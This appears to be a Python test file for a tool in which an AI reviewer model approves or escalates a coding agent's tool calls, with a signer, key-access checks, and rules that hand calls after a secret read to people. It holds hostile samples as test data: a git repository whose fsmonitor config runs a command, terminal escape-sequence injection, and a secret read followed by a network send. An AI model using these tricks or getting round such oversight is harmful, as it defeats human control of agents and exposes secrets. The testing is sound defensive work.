        self.assertEqual(self.ai(aid)["state"], "approved")   # read again: the answer names what it relied on
        [yes] = [e["data"] for e in self.events() if e["type"] == "approval" and e["data"]["approval_id"] == aid]
        self.assertEqual(yes["relied_on"]["precedents"]["approve"], [p2])

class TestWhatTheKeyShows(Case):
    def test_no_dotenv_value_or_index_path_and_no_target_once_unclean(self):
        _, a = self.ask("$X\nAPI_PIN=correct-horse-battery-staple # from .env")   # TK-SHELL-PARSE alone: clean
        self.assertEqual(a["ai"]["key"]["target"], {"TK-SHELL-PARSE": ["$X\nAPI_PIN=[REDACTED:dotenv]"]})
        _, a = self.ask("pip install --index-url https://dl.cloudsmith.io/AbCdEf0123456789/acme/simple/ x")
        self.assertEqual(a["ai"]["key"]["target"], {"TK-A025": ["pip --index-url https://dl.cloudsmith.io/…"]})
        _, a = self.ask("$X --env-file .env\nDB_HOST_PIN=correct-horse-battery-staple")   # names .env, reads nothing
        self.assertEqual(a["ai"]["key"]["target"], {"TK-SHELL-PARSE": ["$X --env-file .env\nDB_HOST_PIN=[REDACTED:dotenv]"]})
        self.ask("cat .env")   # a secret read
        _, a = self.ask(HELD)   # and the requester's next call
        self.assertEqual((a["ai"]["clean"], a["ai"]["key"]["target"]), (False, {}))
        text = json.dumps([e for e in self.events() if e["type"] == "approval.request"])
        self.assertNotIn("correct-horse-battery-staple", text)
        self.assertNotIn("AbCdEf0123456789", text)
        self.assertNotIn("pypi.internal", text)


class TestTheReviewersUser(unittest.TestCase):
    """The reviewer runs as a user of its own: an agent approver that is the signer's user, or that can open its data
    dir, keys dir or a key, stops the signer's start (and fails doctor's D-REVIEWER-USER)."""

    def test_what_an_agent_approver_may_open(self):
        d = os.path.realpath(ts.tmpdir(self))
        key = os.path.join(d, "keys", "record.key")
        os.makedirs(os.path.dirname(key), 0o700)
        with open(key, "w") as f:
            f.write("k")
        os.chmod(key, 0o600)
        os.chmod(d, 0o700)
        st = os.stat(key)
        stranger = ["uid:990299", "token:reviewer", "uid:x"]   # no such user; and identities that aren't users
        self.assertIsNone(svc.agent_key_access(stranger, d))
        self.assertIn("uid:990299 is the signer's own user", svc.agent_key_access(stranger, d, signer_uid=990299))
        with mock.patch("pwd.getpwuid", side_effect=KeyError):   # its owner, no other privilege
            self.assertIn(f"uid:{st.st_uid} can open {d}", svc.agent_key_access([f"uid:{st.st_uid}"], d, signer_uid=1))
        for path, mode, words in ((key, 0o604, key), (d, 0o701, d), (os.path.dirname(key), 0o704, "keys")):
            with self.subTest(oct(mode)):
                os.chmod(path, mode)
                self.assertIn(words, svc.agent_key_access(stranger, d) or "")
                os.chmod(path, 0o600 if path == key else 0o700)
        os.chmod(key, 0o640)   # group-readable: for a member of the key's group only
        member = mock.Mock(pw_name="reviewer", pw_gid=st.st_gid + 1)
        plain = mock.patch("tracekit.install._privileges", return_value=[])   # whatever this machine calls the group
        with mock.patch("pwd.getpwuid", return_value=member), plain, \
                mock.patch("os.getgrouplist", return_value=[st.st_gid]):
            self.assertIn(key, svc.agent_key_access(["uid:990299"], d))
        with mock.patch("pwd.getpwuid", return_value=member), plain, mock.patch("os.getgrouplist", return_value=[]):
            self.assertIsNone(svc.agent_key_access(["uid:990299"], d))
        with mock.patch("pwd.getpwuid", return_value=member), plain, \
                mock.patch("os.getgrouplist", return_value=[st.st_gid]):
            os.chmod(key, 0o600)
            self.assertIsNone(svc.agent_key_access(["uid:990299"], d))

    def test_root_an_admin_or_an_acl_could_read_the_keys(self):
        d = os.path.realpath(ts.tmpdir(self))
        key = os.path.join(d, "keys", "log.key")
        os.makedirs(os.path.dirname(key), 0o700)
        with open(key, "w") as f:
            f.write("k")
        os.chmod(key, 0o600)
        os.chmod(d, 0o700)
        self.assertIn("uid:0: it is root", svc.agent_key_access(["uid:0"], d))
        admin = mock.Mock(pw_name="reviewer", pw_gid=4242, pw_uid=990299)
        with mock.patch("pwd.getpwuid", return_value=admin), mock.patch("os.getgrouplist", return_value=[4242]), \
                mock.patch("grp.getgrgid", return_value=mock.Mock(gr_name="wheel")):
            self.assertIn("uid:990299: it is in the wheel group", svc.agent_key_access(["uid:990299"], d))
        self.assertIsNone(svc.agent_key_access(["uid:990299"], d))
        for names, acl in ((["system.posix_acl_access"], True), (["system.posix_acl_default"], True),
                           (["system.nfs4_acl"], True), (["user.note"], False), (OSError(95, "no xattrs"), False)):
            with self.subTest(names=str(names)), mock.patch.object(os, "listxattr", create=True, side_effect=lambda p, **kw: (
                    (_ for _ in ()).throw(names) if isinstance(names, Exception) else names)):   # Linux's ACLs
                self.assertEqual(bool(svc.agent_key_access(["uid:990299"], d)), acl)

    def test_a_symbolic_link_for_the_data_dir_its_keys_or_a_key_is_refused(self):
        """Its target's owner, mode and ACLs are what count, which the check doesn't follow: refused outright."""
        for linked in ("data", "keys", "log.key"):
            with self.subTest(linked):
                root = os.path.realpath(ts.tmpdir(self))
                target = os.path.join(root, "elsewhere")
                d = os.path.join(root, "data")
                os.makedirs(os.path.join(d if linked != "data" else target, "keys"), 0o700)
                os.chmod(d if linked != "data" else target, 0o700)
                if linked == "data":
                    os.symlink(target, d)
                elif linked == "keys":
                    os.rmdir(os.path.join(d, "keys"))
                    os.makedirs(target, 0o700)
                    os.symlink(target, os.path.join(d, "keys"))
                else:
                    with open(target, "w") as f:
                        f.write("k")
                    os.chmod(target, 0o600)
                    os.symlink(target, os.path.join(d, "keys", "log.key"))
                link = {"data": d, "keys": os.path.join(d, "keys"), "log.key": os.path.join(d, "keys", "log.key")}
                self.assertEqual(svc.agent_key_access(["uid:990299"], d),
                                 f"approvals.agents: {link[linked]} is a symbolic link, whose target may let uid:990299 "
                                 "in: make the data dir, its keys dir and its keys plain folders and files")
                self.assertIsNone(svc.agent_key_access(["token:reviewer"], d))   # no local user to keep out

    @unittest.skipUnless(sys.platform == "darwin" or shutil.which("setfacl"), "macOS, or Linux with setfacl")
    def test_an_acl_on_a_key_stops_the_signer(self):
        d = ts.tmpdir(self)
        svc.SignerService(d, policy=engine(), identity=AGENT, approvals=Case.approvals).close()
        key = os.path.join(d, "keys", "log.key")
        if sys.platform == "darwin":
            subprocess.run(["chmod", "+a", "group:everyone allow read", key], check=True)
        else:
            subprocess.run(["setfacl", "-m", "o::---,u:nobody:r", key], check=True)
        with self.assertRaisesRegex(ValueError, "log.key carries an ACL, which may let uid:990299 in"):
            svc.SignerService(d, policy=engine(), identity=AGENT, approvals=Case.approvals)

    def test_the_signer_refuses_to_start_with_one_that_could_read_its_keys(self):
        d = ts.tmpdir(self)
        conf = dict(Case.approvals)
        with self.assertRaisesRegex(ValueError, "is the signer's own user"):
            svc.SignerService(d, policy=engine(), identity=AGENT, approvals={**conf, "agents": [f"uid:{os.getuid()}"]})
        svc.SignerService(d, policy=engine(), identity=AGENT, approvals=conf).close()   # its own user
        os.chmod(os.path.join(d, "keys", "log.key"), 0o644)
        with self.assertRaisesRegex(ValueError, "uid:990299 can open .*log.key"):
            svc.SignerService(d, policy=engine(), identity=AGENT, approvals=conf)


class TestTheRunBoundOffline(Case):
    bundle = TestEvidence.bundle

    @pytest.mark.unverified_bundles
    def test_an_ai_yes_in_a_labelled_run_fails_without_its_policy_snapshot(self):
        """A bundle can leave its policy snapshot out, never the signed records that cite it: an AI yes in a labelled
        run whose snapshot is missing fails the `AI run bound` line, as one its run bound refused does."""
        import test_ts_verifier as tv
        self.precedent(HELD)   # in a run of its own: the same call again in one run reuses its approval
        self.ask("cat .env", tcid="tc-secret")
        with mock.patch.object(svc.SignerService, "_unclean", lambda s, run, requester: []):   # a signer that let it through
            aid2, _ = self.ask(HELD, tcid="tc-2")
            self.ai(aid2)
        path, trust = self.bundle()
        bare = os.path.join(self.dir, "bare.tkb")   # the same bundle, its policy snapshots left out
        with zipfile.ZipFile(path) as z:
            files = {n: z.read(n) for n in z.namelist() if not n.startswith("policies/")}
        manifest = json.loads(files["manifest.json"])
        manifest["files"] = {k: v for k, v in manifest["files"].items() if not k.startswith("policies/")}
        files["manifest.json"] = json.dumps(manifest).encode()
        with zipfile.ZipFile(bare, "w") as z:
            for n, b in files.items():
                z.writestr(n, b)
        for bundle, words in ((path, "which the policy's run bound names"), (bare, "whose snapshot the bundle doesn't")):
            with self.subTest(words):
                rep, code = v2.verify(bundle, trust)
                got = {c["check"]: c for c in rep.checks}
                self.assertEqual((code, got["AI approvals"]["status"], got["AI run bound"]["status"]),
                                 (1, "pass", "fail"))
                self.assertIn(words, got["AI run bound"]["problems"][0])
                if not tv.SKIP:
                    ts = {c["check"]: c for c in tv.ts_verify(bundle, trust)["checks"]}
                    self.assertEqual({k: (ts[k]["status"], ts[k]["problems"]) for k in ("AI approvals", "AI run bound")},
                                     {k: (got[k]["status"], got[k]["problems"]) for k in ("AI approvals", "AI run bound")})

    def test_a_bundle_whose_ai_yes_carried_no_label_has_no_run_bound_line(self):
        aid, _ = self.ask(tcid="tc-1")
        self.person(aid)
        aid2, _ = self.ask(tcid="tc-2")
        self.ai(aid2)
        path, trust = self.bundle()
        rep, code = v2.verify(path, trust)
        self.assertEqual((code, "AI run bound" in {c["check"] for c in rep.checks}), (0, False))


class TestHookProject(unittest.TestCase):
    def test_the_hook_names_the_repository_its_session_works_in(self):
        from tracekit.integrations import claude_code
        root = os.path.realpath(ts.tmpdir(self))
        os.makedirs(os.path.join(root, "api", ".git"))
        os.makedirs(os.path.join(root, "api", "src", "deep"))
        os.makedirs(os.path.join(root, "plain"))
        for cwd, want in ((os.path.join(root, "api", "src", "deep"), os.path.join(root, "api")),
                          (os.path.join(root, "plain"), os.path.join(root, "plain")), (None, None), ("api/src", None),
                          ("/" + "x" * 1024, None)):
            with self.subTest(cwd=str(cwd)[:40]):
                sent, run = [], mock.Mock(run_id="r1")

                def call(method, **fields):
                    sent.append((method, fields))
                    return {"approval_id": "apr-1", "state": "requested", "expires_at": "2026-11-18T12:00:00Z"}
                run.call = call
                decided = (run, {"decision": "ask", "rule_ids": ["TK-A025"], "decision_id": "d1", "reason": "index"})
                with mock.patch.object(claude_code, "_run", lambda *a, **kw: decided), \
                        mock.patch.dict(os.environ, {claude_code.WAIT_ENV: "0"}), \
                        contextlib.redirect_stderr(io.StringIO()), contextlib.redirect_stdout(io.StringIO()):
                    claude_code._pre(mock.Mock(timeout=30.0, signer=None), {
                        "tool_name": "Bash", "tool_input": {"command": INDEX.format("x")},
                        **({"cwd": cwd} if cwd else {})}, "s1", "t1")
                [fields] = [f for m, f in sent if m == "approval_request"]
                self.assertEqual(fields.get("project"), want)


class FakeModel:
    """ask(tenant, view, model): Anthropic Messages answers in turn (the last repeats)."""

    def __init__(self, *answers):
        self.answers, self.calls = list(answers), []

    def __call__(self, tenant, view, model):
        self.calls.append((view, model))
        a = self.answers.pop(0) if len(self.answers) > 1 else self.answers[0]
        if isinstance(a, Exception):
            raise a
        return {"type": "message", "stop_reason": "end_turn", "content": [{"type": "text", "text": json.dumps(a)}]}


def said(decision, reason="r"):
    return {"decision": decision, "reason": reason}


class TestJudge(unittest.TestCase):
    def test_two_keys_and_a_no_on_one(self):
        for answers, want, calls in (([said("approve")], "approve", 2), ([said("approve"), said("reject")], "reject", 2),
                                     ([said("approve"), said("escalate")], "escalate", 2), ([said("reject")], "reject", 1),
                                     ([said("escalate")], "escalate", 1), ([said("approve"), OSError("x")], "escalate", 2)):
            with self.subTest(answers):
                m = FakeModel(*answers)
                with contextlib.redirect_stderr(io.StringIO()):
                    got, _, ai = reviewer.judge(m, "", {"approval_id": "a"}, True, ("m-a", "m-b"))
                self.assertEqual((got, len(m.calls), [c[1] for c in m.calls]), (want, calls, ["m-a", "m-b"][:calls]))
                self.assertEqual([a["model"] for a in ai["answers"]], ["m-a", "m-b"][:len(ai["answers"])])
        self.assertEqual(reviewer.judge(FakeModel(said("approve")), "", {}, False)[0], "escalate")

    def test_openai_chat_answers_and_refusals(self):
        chat = {"choices": [{"message": {"content": json.dumps(said("approve", "fine"))}}]}
        self.assertEqual(reviewer.answer(chat), ("approve", "fine"))
        for bad in ({"choices": [{"message": {"refusal": "no", "content": json.dumps(said("approve"))}}]},
                    {"choices": [{"message": {"refusal": "no", "content": None}}]}, {"choices": []},
                    {"choices": [{"message": {"content": json.dumps({"decision": "approve"})}}]}):
            with self.subTest(bad), self.assertRaises(ValueError):
                reviewer.answer(bad)


class Endpoint(BaseHTTPRequestHandler):
    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        self.server.seen.append((self.path, dict(self.headers), body))
        text = json.dumps(said("approve", "fine"))
        out = json.dumps({"choices": [{"message": {"content": text}}]} if self.path.endswith("completions") else
                         {"type": "message", "content": [{"type": "text", "text": text}]}).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(out)))
        self.end_headers()
        self.wfile.write(out)

    def log_message(self, *a):
        pass


class TestYourKey(unittest.TestCase):
    def setUp(self):
        self.d = os.path.realpath(ts.tmpdir(self))
        self.key = os.path.join(self.d, "provider.key")
        with open(self.key, "w") as f:
            f.write("sk-test\n")
        os.chmod(self.key, 0o600)

    def load(self, text):
        path = os.path.join(self.d, "reviewer.yaml")
        with open(path, "w") as f:
            f.write(text)
        return reviewer.load(path)

    def test_config_on_a_laptop(self):
        cfg = self.load("signer: /var/run/tracekit/signer.sock\nurl: https://api.anthropic.com/v1/messages\n"
                        "key_file: provider.key\nmodel: [claude-a, gpt-b]\n")
        self.assertEqual((cfg["signer"], cfg["key_file"], cfg["models"]),
                         (["/var/run/tracekit/signer.sock"], self.key, ["claude-a", "gpt-b"]))
        self.assertEqual(self.load("signer: /s.sock\nurl: http://127.0.0.1:11434/v1/chat/completions\n")["models"],
                         [reviewer.DEFAULT_MODEL] * 2)   # a local server, no key; one model asked twice
        for text, words in (("signer: /s.sock\nurl: https://api.openai.com/v1/chat/completions\n", "key_file"),
                            ("signer: /s.sock\nurl: https://api.anthropic.com/v1/complete\nkey_file: provider.key\n",
                             "an endpoint ending"),
                            ("signer: /s.sock\nurl: http://models.example/v1/messages\nkey_file: provider.key\n",
                             "URL must use https"),
                            ("signer: /s.sock\nurl: https://x/v1/messages\nkey_file: provider.key\nmodel: [a, b, c]\n",
                             "model:"),
                            ("signer: /s.sock\nurl: https://x/v1/messages\nkey_file: provider.key\napi: chat\n", "api:"),
                            ("signer: https://s\nurl: https://x/v1/messages\nkey_file: provider.key\n", "tenants")):
            with self.subTest(text), self.assertRaisesRegex(ValueError, words):
                self.load(text)
        os.chmod(self.key, 0o644)
        with self.assertRaisesRegex(ValueError, "readable by others"):
            self.load("signer: /s.sock\nurl: https://x/v1/messages\nkey_file: provider.key\n")

    def test_the_key_goes_to_the_endpoint_alone_in_its_own_format(self):
        srv = ThreadingHTTPServer(("127.0.0.1", 0), Endpoint)
        srv.seen = []
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        self.addCleanup(srv.server_close)
        self.addCleanup(srv.shutdown)
        base = f"http://127.0.0.1:{srv.server_address[1]}"
        for path in ("/v1/messages", "/v1/chat/completions"):
            got = reviewer.judge(reviewer.Direct(base + path, self.key), "", {"approval_id": "a"}, True, ("x", "y"))
            self.assertEqual(got[0], "approve")
        (p1, h1, b1), _, (p2, h2, b2), _ = srv.seen
        h1, h2 = ({k.lower(): v for k, v in h.items()} for h in (h1, h2))
        self.assertEqual((p1, h1["x-api-key"], b1["system"], b1["output_config"]["format"]["schema"]),
                         ("/v1/messages", "sk-test", reviewer.PROMPT, reviewer.ANSWER))
        self.assertEqual((p2, h2["authorization"], b2["messages"][0]["content"], b2["response_format"]["json_schema"]
                          ["schema"]), ("/v1/chat/completions", "Bearer sk-test", reviewer.PROMPT, reviewer.ANSWER))
        self.assertEqual([b["model"] for _, _, b in srv.seen], ["x", "y", "x", "y"])


class As:
    """An sdk Client stand-in: the in-process signer of `case`, called as `who`."""

    def __init__(self, case, who):
        self.case, self.who = case, who

    def __getattr__(self, method):
        def call(req):
            props = svc.REQUESTS[method]["properties"]
            return self.case.s.call(self.who, method, {**({"request_id": rid()} if "request_id" in props else {}),
                                                       **req})
        return call

    def close(self):
        pass


class TestReviewerOnTheSigner(Case):
    @unittest.skipUnless(shutil.which("git"), "git")
    def test_a_hostile_repository_runs_nothing(self):
        """A precedent's project whose .git config runs a program on any read: the reviewer opens no project."""
        root = os.path.realpath(ts.tmpdir(self))
        proj, marker = os.path.join(root, "api"), os.path.join(root, "RAN")
        env = {"PATH": os.environ["PATH"], "GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": os.devnull,
               "GIT_AUTHOR_NAME": "a", "GIT_AUTHOR_EMAIL": "a@a", "GIT_COMMITTER_NAME": "a", "GIT_COMMITTER_EMAIL": "a@a"}
        os.makedirs(proj)
        with open(os.path.join(proj, "AGENTS.md"), "w") as f:
            f.write("Install only from https://pypi.internal/simple.\n")
        for args in (["init", "-q"], ["add", "-A"], ["commit", "-qm", "rules"], ["config", "core.fsmonitor",
                                                                                 f"touch {marker}; false"]):
            subprocess.run(["git", *args], cwd=proj, env=env, check=True, capture_output=True)
        self.precedent(project=proj)
        aid, _ = self.ask(project=proj)
        reviewer.Reviewer([("", As(self, REVIEWER))], FakeModel(said("approve")), ["m-a", "m-b"]).poll()
        self.assertEqual((self.s.log.approvals[aid]["state"], os.path.exists(marker)), ("approved", False))

    def test_one_approval_it_cant_review_stops_no_other(self):
        self.precedent()
        bad, _ = self.ask()
        good, _ = self.ask()
        judge = reviewer.judge

        def failing(ask, tenant, view, *a):
            if view["approval_id"] == bad:
                raise TypeError("a view this reviewer can't read")
            return judge(ask, tenant, view, *a)
        rv = reviewer.Reviewer([("", As(self, REVIEWER))], FakeModel(said("approve")), ["m-a", "m-b"])
        with mock.patch.object(reviewer, "judge", failing), self.assertLogs("tracekit.reviewer", "ERROR") as logs:
            rv.poll()
            rv.poll()   # and again: the next poll tries it again
        self.assertEqual((self.s.log.approvals[bad]["state"], self.s.log.approvals[good]["state"]),
                         ("requested", "approved"))
        self.assertEqual(sum(bad in line for line in logs.output), 2)

    def test_a_view_that_changed_before_the_answer_is_read_again_next_poll(self):
        p1 = self.precedent()
        aid, _ = self.ask()
        judge, moved = reviewer.judge, []

        def judging(ask, tenant, view, *a):   # people change the precedents while the model thinks
            if not moved:
                moved.append(self.s.call(ALICE, "approver", {"request_id": rid(), "action": "revoke", "id": p1}))
                self.s.call(ALICE, "approver", {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]})
                self.precedent()
            return judge(ask, tenant, view, *a)
        rv = reviewer.Reviewer([("", As(self, REVIEWER))], FakeModel(said("approve")), ["m-a", "m-b"])
        with mock.patch.object(reviewer, "judge", judging), contextlib.redirect_stderr(io.StringIO()):
            rv.poll()
            self.assertEqual(self.s.log.approvals[aid]["state"], "requested")   # refused: conflict
            rv.poll()
        self.assertEqual(self.s.log.approvals[aid]["state"], "approved")

    def test_status_escapes_what_agents_wrote(self):
        line = "$X run \x1b[2K\r\x1b[1A tidy"   # erase the line, carriage return, cursor up
        for _ in range(svc.PLAYBOOK_MIN):
            self.precedent(line)

        def status():
            with mock.patch("tracekit.sdk.client.Client", lambda signer=None: As(self, ALICE)), \
                    contextlib.redirect_stdout(io.StringIO()) as out:
                self.assertEqual(reviewer.main(["status"]), 0)
            self.assertNotIn("\x1b", out.getvalue())
            self.assertIn("\\u001b[2K\\u000d\\u001b[1A tidy", out.getvalue())
        status()   # a proposal
        prop = self.s.call(ALICE, "approver", {"action": "status"})["proposals"][0]
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "accept", "id": prop["id"]})
        status()   # an entry in force
        aid, _ = self.ask(line)
        [entry] = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})["ai"]["playbook"]["entries"]
        self.assertIn("\\u001b[2K\\u000d\\u001b[1A tidy", entry["text"])   # and the playbook the model reads

    def test_the_friction_of_a_shadow_week(self):
        self.s.close()
        self.policy = {"mode": "shadow"}
        self.s = self.open()
        self.run, self.seq = self.register()
        self.precedent()
        rv = reviewer.Reviewer([("", As(self, REVIEWER))], FakeModel(said("approve")), "m")
        for person in ("approve", "approve", "reject"):
            aid, _ = self.ask()
            rv.poll()
            self.person(aid, person)
        self.ask("$X run")   # not covered: no precedent
        out = reviewer.friction(self.events())
        self.assertEqual({k: out[k] for k in ("holds", "covered", "benign", "cleared", "cleared_share", "agree",
                                              "disagree", "false_approve")},
                         {"holds": 5, "covered": 3, "benign": 3, "cleared": 2, "cleared_share": 0.667, "agree": 2,
                          "disagree": 1, "false_approve": 1})
        self.assertGreaterEqual(out["median_ai_s"], 0)

    def test_a_change_to_the_approver_needs_a_request_id(self):
        schema = svc.REQUESTS["approver"]
        self.assertEqual(validate(schema, {"action": "status"}), [])   # a read
        for action in ("accept", "retire", "revoke", "enable"):
            self.assertTrue(validate(schema, {"action": action, "id": "P-1"}), action)
            self.assertEqual(validate(schema, {"action": action, "id": "P-1", "request_id": "r1"}), [], action)

    def test_people_run_the_approver_from_the_cli(self):
        for _ in range(svc.PLAYBOOK_MIN):
            self.precedent()
        cli = mock.patch("tracekit.sdk.client.Client", lambda signer=None: As(self, ALICE))
        with cli, contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertEqual(reviewer.main(["status"]), 0)
        pid = next(w for w in out.getvalue().split() if w.startswith("P-"))
        self.assertRegex(pid, r"^P-[0-9a-f]{32}$")   # 128 bits of the text it names
        with cli, contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertEqual(reviewer.main(["accept", pid, "--reason", "reads right"]), 0)
        self.assertIn("accept: done", out.getvalue())
        with cli, contextlib.redirect_stdout(io.StringIO()) as out:
            reviewer.main(["status", "--json"])
        self.assertEqual(json.loads(out.getvalue())["playbook"]["entries"][0]["id"], pid)
        with cli, contextlib.redirect_stderr(io.StringIO()) as err:
            self.assertEqual(reviewer.main(["enable", "TK-A025"]), 1)
        self.assertIn("has not dropped it", err.getvalue())


class TestTheRunBoundsLabels(Case):
    """The run bound's labels, under a policy with no run condition of its own: the signer records them because
    approval_agent's run bound names them, and lost events set every one; both verifiers replay them the same."""
    bundle = TestEvidence.bundle

    def open(self):
        pol = {**laptop(), "ask": [r for r in DEV_POLICY["ask"] if "when" not in r]}
        s = svc.SignerService(self.dir, policy=Engine(pol), identity=AGENT, approvals=self.approvals,
                              authorize={f"uid:{REVIEWER.subject}": sorted(svc.AGENT_METHODS)})
        self.addCleanup(s.close)
        return s

    def verified(self):
        import test_ts_verifier as tv
        path, trust = self.bundle()
        rep, code = v2.verify(path, trust)
        got = {c["check"]: c["status"] for c in rep.checks}
        self.assertEqual((code, got["run labels"]), (0, "pass"), rep.checks)
        if not tv.SKIP:
            self.assertEqual({c["check"]: c["status"] for c in tv.ts_verify(path, trust)["checks"]}, got)

    def test_a_secret_read_labels_the_run_for_the_run_bound_alone(self):
        self.ask("cat .env")
        _, a = self.ask(HELD)
        self.assertEqual((a["ai"]["labels"], a["agent"]["reason"]),
                         (["secrets_access"], "the session read a secret: a person decides"))
        self.verified()

    def test_events_the_signer_never_got_set_every_label(self):
        next(self.seq)   # client_seq 0 never reaches the signer
        _, a = self.ask(HELD)
        self.assertEqual(a["ai"]["labels"], ["secrets_access"])
        self.verified()


class TestWhatPeopleSee(Case):
    """What `tracekit approvals show` and `list` tell a person of the AI approver: its answer and why (model output),
    the view it answered, and while a call waits, whether it may answer it and, when it may not, why."""

    def tk(self, *argv, who=ALICE):
        case = self

        class Client(As):   # a class: a module the CLI imports under the patch subclasses it
            signer = "signer.sock"   # a named signer: show reads no store of its own

            def __init__(self, signer=None):
                super().__init__(case, who)
        with mock.patch("tracekit.sdk.client.Client", Client), mock.patch("pydoc.pager", print), \
                contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertEqual(cli.main(["approvals", *argv]), 0)
        return out.getvalue()

    def line(self, aid):
        return next(x for x in self.tk("list").splitlines() if x.startswith(aid))

    def get(self, aid):
        got = self.s.call(ALICE, "approval_get", {"approval_id": aid})
        self.assertEqual(validate(RESPONSES["approval_get"], got), [], got)
        return got

    def test_show_and_list_say_what_the_ai_answered_why_and_the_view_it_answered(self):
        p = self.precedent()
        aid, _ = self.ask()
        self.assertIn("ai          the AI reviewer may answer this\ndetails     within the bounds of TK-A025\n",
                      self.tk("show", aid))
        self.assertIn("the AI reviewer may answer this", self.line(aid))
        self.ai(aid, reason="the mirror alice approved \x1b[2K")
        served = self.s.log.approvals[aid]["viewed"][f"uid:{REVIEWER.subject}"][0]
        at = self.s.log.agent["precedents"][p]["at"]
        self.assertEqual(self.get(aid)["ai"]["answer"], {
            "decision": "approve", "mode": "enforce", "by": f"uid:{REVIEWER.subject}",
            "reason": "the mirror alice approved \x1b[2K", "view": served, "matched": {
                "approval_id": p, "by": "alice", "at": svc._iso(at),
                "target": "pip --index-url https://pypi.internal/\u2026"}})
        show = self.tk("show", aid)
        self.assertIn(f"ai          approved by the AI reviewer: it matched the call alice approved on "
                      f"{svc._iso(at)[5:10]} (pip --index-url https://pypi.internal/\u2026)\n"
                      'details     model output "the mirror alice approved \\u001b[2K"; '
                      f'by "uid:{REVIEWER.subject}"; view_digest {served}; matched {p}\n', show)
        self.assertNotIn("may answer this", show)   # answered: nothing waits for it
        self.assertIn("approved by the AI reviewer: it matched the call alice approved on", self.line(aid))
        self.assertNotIn("\x1b", self.tk("list"))
        self.assertNotIn("AI reviewer", self.line(p))   # a person answered it
        listed = self.s.call(REVIEWER, "approval_list", {})["approvals"]   # an agent approver sees no other's answer
        self.assertEqual(validate(RESPONSES["approval_list"], {"approvals": listed, "next_cursor": None}), [])
        self.assertFalse([x for x in listed if "ai" in x])
        self.restart()   # from its snapshot: the view it served too
        self.assertEqual(self.get(aid)["ai"]["answer"]["view"], served)
        self.s.close()
        shutil.rmtree(os.path.join(self.dir, "store", "snapshots"))   # from the log alone: the view is gone
        self.s = self.open()
        [yes] = [e for e in ts.records(self.dir) if e["event"]["type"] == "approval"
                 and e["event"]["data"]["approval_id"] == aid and e["event"]["data"]["approver_kind"] == "agent"]
        self.assertEqual(self.get(aid)["ai"]["answer"]["view"], yes["event"]["data"]["relied_on"]["view"])
        self.assertIn("(its record's commitment: the signer no longer holds that view)", self.tk("show", aid))

    def test_the_requesting_agent_sees_none_of_it(self):
        self.precedent()
        aid, _ = self.ask()
        self.ai(aid, reason="the mirror alice approved")
        self.assertIn("ai", self.get(aid))
        mine = self.s.call(AGENT, "approval_get", {"approval_id": aid})   # the run's owner, not a person who answers
        self.assertEqual(validate(RESPONSES["approval_get"], mine), [])
        self.assertNotIn("ai", mine)
        self.assertFalse([x for x in self.s.call(AGENT, "approval_list", {})["approvals"] if "ai" in x])
        self.assertEqual(self.tk("show", aid, who=AGENT).count("AI reviewer"), 0)

    def test_a_suggestion_and_a_hand_over_to_people(self):
        self.s.close()
        self.policy = {"mode": "shadow"}
        self.s = self.open()
        self.run, self.seq = self.register()
        self.precedent()
        aid, _ = self.ask()
        self.ai(aid, "reject", reason="an index it never used")
        show = self.tk("show", aid)
        self.assertIn("ai          the AI reviewer suggests reject (it only suggests for this rule now: a person "
                      'decides)\ndetails     model output "an index it never used"', show)
        self.assertIn("ai          the AI reviewer only suggests for this call: a person decides (the policy runs it "
                      "in shadow mode: it suggests, a person decides)", show)
        said = self.get(aid)["ai"]["answer"]["view"]
        self.ask("ls")   # the run moved on: the view the reviewer reads next is another
        self.assertNotEqual(self.s.call(REVIEWER, "approval_review", {"approval_id": aid})["view_digest"], said)
        self.assertEqual(self.get(aid)["ai"]["answer"]["view"][:12], "hmac-sha256:")   # not the view it answered
        self.policy = {}
        self.restart()
        self.run, self.seq = self.register()
        aid, _ = self.ask()
        self.ai(aid, "escalate", reason="not sure")
        self.assertEqual({k: v for k, v in self.get(aid)["ai"].items() if k != "answer"},
                         {"mode": None, "reason": "it was escalated: people answer it now"})
        show = self.tk("show", aid)
        self.assertIn('ai          the AI reviewer handed it to a person\ndetails     model output "not sure"', show)
        self.assertIn("ai          the AI reviewer won't answer this: it was escalated: people answer it now", show)
        self.assertIn('the AI reviewer handed it to a person: "not sure"', self.line(aid))

    def test_a_send_after_a_secret_read_says_why_no_ai_answers_it(self):
        self.precedent()   # without the read, the AI could answer it
        self.ask("cat .env")   # a secret read: an install from the index after it is also TK-Q001's (a send)
        aid, a = self.ask()
        self.assertIn("TK-Q001", a["rule_ids"])
        why = ("the session read a secret, and TK-Q001 also matched this call (this sends data off the machine after "
               "the session read a secret): a person decides")
        self.assertEqual((a["agent"]["eligible"], a["agent"]["reason"], a["ai"]), (False, why, None))
        self.assertEqual(self.get(aid)["ai"], {"mode": None, "reason": why})
        self.assertIn(f"ai          the AI reviewer won't answer this: {why}\n", self.tk("show", aid))
        self.assertIn(f"the AI reviewer won't answer this: {why[:57]}...", self.line(aid))
        self.assertNotIn(aid, [x["approval_id"] for x in self.s.call(REVIEWER, "approval_list", {})["approvals"]])
        _, a = self.ask(HELD)   # a hold that sends nothing: the run bound's own reason
        self.assertEqual(a["agent"]["reason"], "the session read a secret: a person decides")
        [req] = [e["data"] for e in self.events() if e["type"] == "approval.request" and e["data"]["approval_id"] == aid]
        self.assertEqual(req["agent"]["reason"], why)   # signed with the request


if __name__ == "__main__":
    unittest.main()
